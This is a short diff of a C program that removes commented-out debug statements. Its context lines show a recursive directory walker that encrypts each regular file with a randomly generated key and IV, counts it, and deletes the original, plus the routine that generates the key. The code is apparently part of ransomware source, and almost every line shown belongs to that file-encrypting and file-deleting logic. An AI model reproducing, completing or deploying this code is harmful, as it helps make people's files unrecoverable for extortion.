@@ -141,7 +141,7 @@ void listdir(const char *name, unsigned char *iv, unsigned char *key, char de_fl
 			strcat(path, "/");
 			strcat(path, entity->d_name);
 				
-			//printf("[type of folder : %d]  %s/%s\n",entity->d_type,name,entity->d_name);			
+						
 			if(entity->d_type == DT_DIR && strcmp(entity->d_name, ".")!=0 && strcmp(entity->d_name, "..")!=0)
 			{
 				listdir(path, iv, key, de_flag,nb);
@@ -150,7 +150,7 @@ void listdir(const char *name, unsigned char *iv, unsigned char *key, char de_fl
 			if(de_flag=='e' && entity->d_type == DT_REG && !is_encrypted(entity->d_name) ==0 && !is_a_video(entity->d_name) ==0)
 			{				
 				encrypt(key, iv, path);
-				//change_nb(nb);
+				
 				*nb = *nb+1;
 				remove(path);				
 			}
@@ -170,8 +170,7 @@ int generate_key(unsigned char *key, int sizeKey, unsigned char *iv, int sizeIv,
 {
 	if (!RAND_bytes(key, sizeKey) || !RAND_bytes(iv, sizeIv)) 
 	{
-		// fprintf(stderr, "L'erreur est %s\n", strerror(errno));
-		// return errno;		
+			
 		handleErrors();
 	}
 	
